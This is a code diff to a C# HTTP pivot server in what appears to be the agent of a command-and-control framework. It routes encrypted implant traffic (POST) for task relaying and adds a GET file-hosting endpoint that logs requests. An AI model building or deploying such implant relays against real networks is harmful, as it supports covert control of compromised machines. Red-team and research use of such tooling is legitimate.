@@ -18,8 +18,10 @@ namespace Agent.Service.Pivoting
 {
     public class PivotHttpServer : PivotServer
     {
+        IWebHostService webHostService;
         public PivotHttpServer(ConnexionUrl conn, string serverKey) : base(conn, serverKey)
         {
+            webHostService = ServiceProvider.GetService<IWebHostService>();
         }
 
 
@@ -31,7 +33,7 @@ namespace Agent.Service.Pivoting
                 var listener = new HttpListener();
 
                 string url = "http://" + Connexion.Address + ":" +Connexion.Port + "/";
-                
+
                 listener.Prefixes.Add(url);
                 listener.Start();
 
@@ -61,48 +63,87 @@ namespace Agent.Service.Pivoting
 
             try
             {
-                HttpListenerRequest request = client.Request;
-                HttpListenerResponse response = client.Response;
-
-                if (!client.Request.Url.LocalPath.ToLower().StartsWith("/ci/") || client.Request.HttpMethod != "POST")
-                {
-                    await response.ReturnNotFound();
-                    return;
-                }
-
-                string content = string.Empty;
-                using (StreamReader reader = new StreamReader(request.InputStream, request.ContentEncoding))
-                {
-                    content = await reader.ReadToEndAsync();
-                    Debug.WriteLine("HTTP Pivot : POST Request Content: " + content);
-                }
-
-                var responses = Encoding.UTF8.GetBytes(content).Deserialize<List<MessageResult>>();
-                _messageService.EnqueueResults(responses);
-
-                var relays = this.ExtractRelays(responses);
-
-                var tasks = this._messageService.GetMessageTasksToRelay(relays);
-
-                response.StatusCode = 200;
-                response.ContentType = "text/plain";
-                byte[] buffer = tasks.Serialize();
-                response.ContentLength64 = buffer.Length;
-                System.IO.Stream output = response.OutputStream;
-                await output.WriteAsync(buffer, 0, buffer.Length);
-                output.Close();
-
+                if (client.Request.HttpMethod == "POST")
+                    await this.HandleImplant(client);
+                else if (client.Request.HttpMethod == "GET")
+                    await this.handleWebHost(client);
+                else
+                    await client.Response.ReturnNotFound();
             }
             catch (Exception ex)
             {
 #if DEBUG
                 Debug.WriteLine(ex);
 #endif
+                await client.Response.ReturnNotFound();
             }
             finally
             {
                 Debug.WriteLine($"HTTP Pivot  : disconnected");
             }
         }
+
+        private async Task HandleImplant(HttpListenerContext client)
+        {
+            HttpListenerRequest request = client.Request;
+            HttpListenerResponse response = client.Response;
+            string content = string.Empty;
+
+            using (StreamReader reader = new StreamReader(request.InputStream, request.ContentEncoding))
+            {
+                content = await reader.ReadToEndAsync();
+                //Debug.WriteLine("HTTP Pivot : POST Request Content: " + content);
+            }
+            var dec = this.Encryptor.DecryptFromBase64(content);
+
+            var responses = dec.Deserialize<List<MessageResult>>();
+            _messageService.EnqueueResults(responses);
+
+            var relays = this.ExtractRelays(responses);
+
+
+            var tasks = this._messageService.GetMessageTasksToRelay(relays);
+            var taskBytes = tasks.Serialize();
+            var taskEncb64 = this.Encryptor.EncryptAsBase64(taskBytes);
+
+
+
+            response.StatusCode = 200;
+            response.ContentType = "text/plain";
+            using (var writer = new StreamWriter(response.OutputStream))
+                writer.Write(taskEncb64);
+        }
+
+        private async Task handleWebHost(HttpListenerContext client)
+        {
+            var path = client.Request.Url.LocalPath.TrimStart('/');
+            Debug.WriteLine(path);
+            var log = new WebHostLog()
+            {
+                Path = path,
+                Date = DateTime.UtcNow,
+                UserAgent = client.Request.Headers.AllKeys.Contains("UserAgent") ? client.Request.Headers["UserAgent"].ToString() : String.Empty,
+                Url = client.Request.Url.ToString(),
+            };
+
+            var fileContent = webHostService.GetFile(path);
+
+            if (fileContent == null)
+            {
+                log.StatusCode = 404;
+                this.webHostService.Addlog(log);
+                await client.Response.ReturnNotFound();
+                return;
+            }
+
+            log.StatusCode = 200;
+            this.webHostService.Addlog(log);
+
+            await client.Response.ReturnFile(fileContent);
+
+            return;
+
+        }
+
     }
 }
